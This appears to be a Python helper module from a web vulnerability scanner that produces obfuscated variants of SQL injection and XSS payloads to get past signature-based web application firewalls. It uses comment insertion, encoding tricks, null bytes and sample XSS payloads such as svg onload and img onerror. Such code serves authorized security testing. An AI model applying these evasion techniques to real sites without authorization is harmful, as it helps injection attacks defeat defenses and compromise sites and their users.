"""WAF bypass payload obfuscation helpers.

Used by SQLi/XSS detectors to attempt payload variants that evade
signature-based WAFs (Cloudflare, AWS WAF, ModSecurity CRS).
"""
import random
from typing import List


def obfuscate_sql_payload(payload: str) -> List[str]:
    """Return obfuscated variants of a SQL payload."""
    variants = [payload]
    # Case toggling
    variants.append(''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)))
    # Inline comments between keywords
    variants.append(
        payload.replace(' OR ', '/**/OR/**/')
               .replace(' AND ', '/**/AND/**/')
               .replace(' UNION ', '/**/UNION/**/')
               .replace(' SELECT ', '/**/SELECT/**/')
    )
    # URL-encoded spaces
    variants.append(payload.replace(' ', '%20'))
    variants.append(payload.replace(' ', '/**/'))
    variants.append(payload.replace(' ', '+'))
    # Double-encoded quotes
    variants.append(payload.replace("'", '%2527').replace('"', '%2522'))
    # Unicode/tab whitespace
    variants.append(payload.replace(' ', '\t'))
    return list(dict.fromkeys(variants))  # de-dup, preserve order


def obfuscate_xss_payload(payload: str) -> List[str]:
    """Return obfuscated variants of an XSS payload."""
    variants = [payload]
    # Case toggling on tag names
    variants.append(payload.replace('script', 'ScRiPt').replace('alert', 'AlErT'))
    # HTML entity encoding of angle brackets
    variants.append(payload.replace('<', '&#60;').replace('>', '&#62;'))
    # JavaScript unicode escape for `alert`
    variants.append(payload.replace('alert', '\\u0061lert'))
    # Backtick template literal call
    variants.append(payload.replace('alert(1)', 'alert`1`'))
    # SVG onload variant
    if '<script' in payload.lower():
        variants.append('<svg/onload=alert(1)>')
        variants.append('<img src=x onerror=alert(1)>')
    # Null byte between tag chars
    variants.append(payload.replace('<script', '<scri\x00pt'))
    return list(dict.fromkeys(variants))


def random_case(s: str) -> str:
    return ''.join(random.choice([c.upper(), c.lower()]) for c in s)
